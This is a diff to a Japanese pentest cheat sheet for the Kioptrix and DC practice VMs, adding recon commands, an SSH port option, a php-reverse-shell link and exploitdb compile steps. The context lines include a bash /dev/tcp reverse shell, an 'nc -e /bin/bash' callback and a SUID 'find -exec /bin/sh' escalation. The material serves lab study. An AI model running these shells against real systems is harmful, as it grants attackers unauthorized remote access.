@@ -1,4 +1,4 @@
-🐻 Kioptrix#1/#2/#3/#4 DC-1/DC-2
+🐻 Kioptrix#1/#2/#3/#4 DC-1/DC-2/DC-3
 
 ## Reconnaissance
 
@@ -26,12 +26,13 @@ Webサーバ／[dirsearch](https://github.com/maurosoria/dirsearch)
 状態確認
 
     uname -a
-    cat /etc/redhat-release
+    cat /etc/redhat-release  #Redhat
+    lsb_release -a           #Ubuntu
     cat /proc/version
 
-SSH／認証鍵使わずに接続
+SSH／認証鍵・ポート指定
 
-     ssh -o PubkeyAuthentication=no user@10.0...
+     ssh -o PubkeyAuthentication=no -p 7720 user@10.0...
 
 MySQL
 
@@ -90,18 +91,24 @@ Spawning A TTY Shell
     find /etc/passwd -exec /bin/sh \;  #SUID
 
 
-[bashリバースシェル](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
+[リバースシェル](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
     nc -lvp 9999
 
     ;bash -i >& /dev/tcp/ip/9999 0>&1
     nc ip 9999 -e /bin/bash
 
+[php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell)
+
+ - CMS内で直接ファイルを編集・任意実行できる仕組みは無いか？
+ - テンプレート・プラグイン読み込み機能は？
+
+
 [exploitdb](https://github.com/offensive-security/exploitdb)
 
     searchsploit CentOS 4.0
     cp /opt/exploitdb/exploits/linux_x86/local/XXX.c XXX.c
-    gcc gcc XXX.c -o test
+    gcc XXX.c -o test
     ./test
 
 sqlmap 
